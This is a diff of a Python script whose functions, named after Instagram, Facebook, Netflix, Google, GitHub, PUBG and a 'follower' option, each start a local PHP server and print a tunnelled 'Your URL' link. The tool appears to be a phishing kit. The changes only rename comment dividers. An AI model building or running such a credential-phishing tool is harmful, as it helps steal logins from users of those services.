@@ -172,7 +172,7 @@ def instagram():
     except ValueError:
         exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
-#====================================================================================================
+#Run Localhost====================================================================================================
     php_server()
     
     sleep(1)
@@ -187,7 +187,7 @@ def instagram():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
     print("                          " , end="\r")
-#====================================================================================================
+#Generate Link====================================================================================================
 
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
@@ -305,7 +305,7 @@ def facebook():
     except ValueError:
             exit(f"""{Fore.YELLOW}│
     ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
-#====================================================================================================
+#Run Localhost====================================================================================================
     php_server()
 
     sleep(1)
@@ -320,7 +320,7 @@ def facebook():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
     print("                          " , end="\r")
-#====================================================================================================
+#Generate Link====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     sleep(0.1)
@@ -438,7 +438,7 @@ def netflix():
             exit(f"""{Fore.YELLOW}│
     ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 
-#====================================================================================================
+#Run Localhost====================================================================================================
     php_server()
 
     sleep(1)
@@ -453,7 +453,7 @@ def netflix():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
     print("                          " , end="\r")
-#====================================================================================================
+#Generate Link====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     sleep(0.1)
@@ -571,7 +571,7 @@ def Google():
     except ValueError:
             exit(f"""{Fore.YELLOW}│
     ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
-#====================================================================================================
+#Run Localhost====================================================================================================
     php_server()
 
     sleep(1)
@@ -586,7 +586,7 @@ def Google():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
     print("                          " , end="\r")
-#====================================================================================================
+#Generate Link====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     sleep(0.1)
@@ -703,7 +703,7 @@ def Github():
     except ValueError:
             exit(f"""{Fore.YELLOW}│
     ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
-#====================================================================================================
+#Run Localhost====================================================================================================
     php_server()
 
     sleep(1)
@@ -718,7 +718,7 @@ def Github():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
     print("                          " , end="\r")
-#====================================================================================================
+#Generate Link====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     sleep(0.1)
@@ -834,7 +834,7 @@ def Pubg():
     except ValueError:
         exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
-#====================================================================================================
+#Run Localhost====================================================================================================
     php_server()
 
     sleep(1)
@@ -849,7 +849,7 @@ def Pubg():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
     print("                          " , end="\r")
-#====================================================================================================
+#Generate Link====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     sleep(0.1)
@@ -968,7 +968,7 @@ def follower():
     except ValueError:
         exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
-#====================================================================================================
+#Run Localhost ====================================================================================================
     php_server()
     
     sleep(1)
@@ -983,7 +983,7 @@ def follower():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
     print("                          " , end="\r")
-#====================================================================================================
+#Generate Link====================================================================================================
 
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
